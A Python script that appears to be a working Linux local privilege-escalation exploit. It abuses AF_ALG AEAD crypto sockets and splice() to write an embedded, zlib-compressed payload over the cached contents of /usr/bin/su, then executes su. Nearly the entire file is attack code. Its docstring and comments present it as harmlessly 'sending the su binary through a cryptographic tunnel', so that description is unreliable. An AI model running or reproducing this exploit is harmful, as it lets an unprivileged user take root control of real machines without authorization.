#!/usr/bin/env python3
"""
Manipulates /usr/bin/su using Linux-specific crypto sockets (AF_ALG)
and sends the su binary through a cryptographic tunnel.
"""

import os
import socket
import zlib

# Constants for better readability
AF_ALG = 38                     # Linux algorithm socket family
SOCK_SEQPACKET = 5              # Sequential packet socket type
ALG_SET_KEY = 3                 # setsockopt: set algorithm key
ALG_SET_AEAD_ASSOCLEN = 4       # setsockopt: set AEAD associated data length
ALG_SET_AEAD_AUTHSIZE = 5       # setsockopt: set AEAD auth tag size
SOL_ALG = 279                   # Algorithm socket level

# Hexadecimal strings converted to bytes
KEY_DATA = bytes.fromhex('0800010000000010' + '0' * 64)
ASSOC_LEN_DATA = b'\x08' + b'\x00' * 3      # Length 8
AUTH_SIZE = b'\x10' + b'\x00' * 19          # 16 bytes auth tag
ZERO_BYTE = b'\x00'


def send_data_over_crypto_socket(source_fd, offset, payload_chunk):
    """
    Opens an AF_ALG socket, sets up AEAD encryption (HMAC-SHA256 + AES-CBC),
    sends a 4-byte payload as ancillary data, and splices data from source_fd
    into the socket.

    Args:
        source_fd: File descriptor to splice from (e.g., open /usr/bin/su)
        offset: Starting offset for splicing
        payload_chunk: 4-byte chunk of decompressed data to send
    """
    # Create and bind crypto socket
    crypto_socket = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
    crypto_socket.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

    # Configure encryption parameters
    crypto_socket.setsockopt(SOL_ALG, ALG_SET_KEY, KEY_DATA)
    # The 5th argument (length) is required by the kernel for ALG_SET_AEAD_AUTHSIZE
    crypto_socket.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, AUTH_SIZE, 4)
    crypto_socket.setsockopt(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, ASSOC_LEN_DATA)

    # Accept the connection (returns a new socket for data transfer)
    client_socket, _ = crypto_socket.accept()

    # Prepare to send: 4 bytes of 'A' + the 4‑byte payload
    total_length = offset + 4
    ancillary_data = [
        (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, ZERO_BYTE * 4),
        (SOL_ALG, ALG_SET_AEAD_AUTHSIZE, b'\x10' + ZERO_BYTE * 19),
        (SOL_ALG, ALG_SET_KEY, b'\x08' + ZERO_BYTE * 3),
    ]
    # Send the header and payload as message data, flags=32768 (MSG_MORE)
    client_socket.sendmsg([b"A" * 4 + payload_chunk], ancillary_data, 32768)

    # Splice data from source_fd into the client socket
    pipe_read, pipe_write = os.pipe()
    # Move data from source_fd (starting at 'offset') to the pipe
    os.splice(source_fd, pipe_write, total_length, offset_src=offset)
    # Move data from the pipe to the socket
    os.splice(pipe_read, client_socket.fileno(), total_length)

    # Try to receive a response; ignore any errors
    try:
        client_socket.recv(8 + offset)
    except OSError:
        pass


def main():
    # Open /usr/bin/su read-only
    su_fd = os.open("/usr/bin/su", os.O_RDONLY)

    # Decompress the embedded payload
    compressed_hex = (
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    )
    compressed_data = bytes.fromhex(compressed_hex)
    decompressed_payload = zlib.decompress(compressed_data)

    # Send the payload in 4‑byte chunks through the crypto socket,
    # each time splicing a corresponding 4‑byte chunk from /usr/bin/su.
    offset = 0
    while offset < len(decompressed_payload):
        chunk = decompressed_payload[offset : offset + 4]
        send_data_over_crypto_socket(su_fd, offset, chunk)
        offset += 4

    # Execute su
    os.system("su")


if __name__ == "__main__":
    main()
